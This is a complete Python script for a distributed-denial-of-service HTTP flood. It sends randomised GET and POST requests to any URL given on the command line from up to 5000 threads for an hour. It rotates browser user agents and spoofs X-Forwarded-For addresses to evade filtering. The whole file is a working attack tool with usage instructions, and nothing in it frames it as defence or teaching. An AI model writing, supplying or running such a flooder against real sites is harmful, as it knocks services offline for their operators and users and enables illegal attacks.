#!/usr/bin/env python3
import requests
import threading
import time
import random
import sys
import os
from concurrent.futures import ThreadPoolExecutor

class DDoSAttack:
    def __init__(self, target, threads=5000, duration=3600):
        self.target = target
        self.threads = threads
        self.duration = duration
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)'
        ]
        self.attack_count = 0
        
    def http_flood(self):
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }
        
        try:
            if random.choice([True, False]):
                requests.get(self.target, headers=headers, timeout=5, verify=False)
            else:
                data = {'data': os.urandom(100).hex()}
                requests.post(self.target, data=data, headers=headers, timeout=5, verify=False)
            
            self.attack_count += 1
            return True
        except:
            return False
    
    def start(self):
        print(f"[+] Target: {self.target}")
        print(f"[+] Threads: {self.threads}")
        print(f"[+] Duration: {self.duration}s")
        print("[+] Starting attack...")
        
        end_time = time.time() + self.duration
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            while time.time() < end_time:
                executor.submit(self.http_flood)
                
                if self.attack_count % 100 == 0:
                    print(f"[+] Requests sent: {self.attack_count}")
        
        print(f"[+] Attack completed! Total requests: {self.attack_count}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python ddos.py <target_url> [threads] [duration]")
        print("Example: python ddos.py https://example.com 5000 3600")
        sys.exit(1)
    
    target = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 5000
    duration = int(sys.argv[3]) if len(sys.argv) > 3 else 3600
    
    attack = DDoSAttack(target, threads, duration)
    attack.start()
